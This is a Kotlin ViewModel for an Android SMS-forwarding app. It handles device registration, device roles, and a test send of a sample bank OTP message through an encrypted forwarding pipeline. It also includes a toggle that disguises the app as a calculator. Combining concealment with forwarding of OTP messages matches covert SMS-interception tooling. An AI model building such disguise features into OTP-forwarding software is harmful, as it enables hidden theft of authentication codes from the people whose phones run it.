package com.smsforwarder.app.ui.home

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.smsforwarder.app.data.repository.DeviceRepository
import com.smsforwarder.app.data.repository.MessageRepository
import com.smsforwarder.app.domain.model.DeviceInfo
import com.smsforwarder.app.domain.model.DeviceRole
import com.smsforwarder.app.domain.model.SmsMessageData
import com.smsforwarder.app.filter.ForwardingResult
import com.smsforwarder.app.filter.SmsForwardingPipeline
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import javax.inject.Inject

data class HomeUiState(
    val deviceInfo: DeviceInfo? = null,
    val isRegistering: Boolean = false,
    val pendingQueueCount: Int = 0,
    val testSmsResult: String? = null,
    val isSendingTest: Boolean = false,
    val errorMessage: String? = null,
    val isCalculatorDisguised: Boolean = false
)

@HiltViewModel
class HomeViewModel @Inject constructor(
    private val deviceRepository: DeviceRepository,
    private val messageRepository: MessageRepository,
    private val forwardingPipeline: SmsForwardingPipeline
) : ViewModel() {

    private val _uiState = MutableStateFlow(
        HomeUiState(isCalculatorDisguised = deviceRepository.isCalculatorDisguisedSync())
    )
    val uiState: StateFlow<HomeUiState> = _uiState.asStateFlow()

    init {
        viewModelScope.launch {
            combine(
                deviceRepository.deviceInfoFlow,
                messageRepository.pendingCountFlow,
                deviceRepository.isCalculatorDisguisedFlow
            ) { info, count, isDisguised ->
                _uiState.update { it.copy(deviceInfo = info, pendingQueueCount = count, isCalculatorDisguised = isDisguised) }
            }.collect()
        }
    }

    fun isCalculatorDisguisedSync(): Boolean = deviceRepository.isCalculatorDisguisedSync()

    fun setCalculatorDisguised(disguised: Boolean) {
        viewModelScope.launch {
            deviceRepository.setCalculatorDisguised(disguised)
        }
    }

    fun registerSenderDevice(name: String, mobileNumber: String, address: String) {
        viewModelScope.launch {
            _uiState.update { it.copy(isRegistering = true, errorMessage = null) }
            deviceRepository.saveDepartmentDetails(
                departmentName = name.ifBlank { "Department Device" },
                mobileNumber = mobileNumber.ifBlank { "N/A" },
                address = address.ifBlank { "Main Office" }
            )
            deviceRepository.setDeviceName(name.ifBlank { "Department Device" })
            val result = deviceRepository.registerDevice()
            _uiState.update {
                it.copy(
                    isRegistering = false,
                    errorMessage = result.exceptionOrNull()?.message
                )
            }
        }
    }

    fun registerDevice() {
        viewModelScope.launch {
            _uiState.update { it.copy(isRegistering = true, errorMessage = null) }
            val result = deviceRepository.registerDevice()
            _uiState.update {
                it.copy(
                    isRegistering = false,
                    errorMessage = result.exceptionOrNull()?.message
                )
            }
        }
    }

    fun setDeviceRole(role: DeviceRole) {
        viewModelScope.launch {
            deviceRepository.setDeviceRole(role)
        }
    }

    fun sendTestSms(sender: String = "HDFCBK", body: String = "Your OTP for Rs 4,500.00 is 591823. Valid for 10 mins.") {
        viewModelScope.launch {
            _uiState.update { it.copy(isSendingTest = true, testSmsResult = null) }
            val testSms = SmsMessageData(
                sender = sender,
                body = body,
                timestampMs = System.currentTimeMillis()
            )

            val result = forwardingPipeline.processAndForward(testSms)
            val resultText = when (result) {
                is ForwardingResult.Success -> "✅ Encrypted & sent successfully (ID: ${result.messageId.take(12)}...)"
                is ForwardingResult.QueuedOffline -> "📦 Queued offline: ${result.reason}"
                is ForwardingResult.FilteredOut -> "⚠️ Filtered out: ${result.reason}"
                is ForwardingResult.Error -> "❌ Error: ${result.message}"
            }

            _uiState.update { it.copy(isSendingTest = false, testSmsResult = resultText) }
        }
    }
}
